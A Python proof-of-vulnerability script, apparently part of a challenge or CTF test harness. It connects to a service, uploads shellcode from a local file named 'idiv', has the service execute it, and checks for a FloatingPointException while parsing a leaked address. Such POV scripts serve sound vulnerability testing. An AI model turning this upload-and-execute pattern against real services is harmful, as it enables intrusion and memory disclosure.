import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import signal

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(1)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z.encode('utf-8')

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def SC( s, data ):

    while len(data):
        if len(data) > 1000:
            s.send(data[:1000])
            data = data[1000:]
            RL(s)
        else:
            s.send(data)
            data = ''

    RL(s)

def RB(s):
    return RU(s, '# ')

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    if 'SEED' in os.environ:
        SEED = int(os.environ['SEED'])
    else:
        SEED = random.randint(0, 2**64 - 1)

    print('[INFO] SEED: {0}'.format(SEED))

    random.seed( SEED )

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)
    
    f = open('idiv', 'rb')

    data = f.read()
    f.close()

    s = connect( HOST, PORT )

    print(f'[INFO] Connected to {HOST}:{PORT}')

    RB(s)

    print('[INFO] Sending shellcode' )
    SW(s, b'4\n')
    RU(s, 'size: ')
    SW(s, str(len(data)).encode('utf-8') + b'\n')
    RL(s)
    SC(s, data)

    print('[INFO] Shellcode Sent')

    RL(s)
    RU(s, '# ')

    SW(s, b'c\n')
    print('[INFO] Beginning execution')

    output = b''
    while True:
        y = RL(s)
        output += y

        y = y.rstrip(b'\n')

        if y.find(b'Complete') != -1 or y.find(b'Unhandled') != -1:
            break;

    try:
        b = output[ output.find(b'FloatingPoint'): ].split(b' ')
        
    except:
        print('[FAILED] Pov did not cause FloatingPointException')
        s.close()
        exit(1)

    sl = int(b[2].split(b'\n')[0], 16)
    print('Address=%x' %(sl))

    s.close()
    print('[SUCCESS] POV completed successfully')
    exit(0)

if __name__ == '__main__':
    main()
